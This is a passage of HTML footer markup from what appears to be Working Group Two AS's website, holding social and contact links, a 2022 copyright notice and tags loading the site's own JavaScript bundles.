class="footer__link-item"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="http://linkedin.com/company/wgtwo" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/contact/">Contact Us</a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">© 2022 Working Group Two AS</div></div></div></footer></div>
<script src="/assets/js/runtime~main.4eea459e.js"></script>
<script src="/assets/js/main.b4708e61.js"></script>
</body>
</html>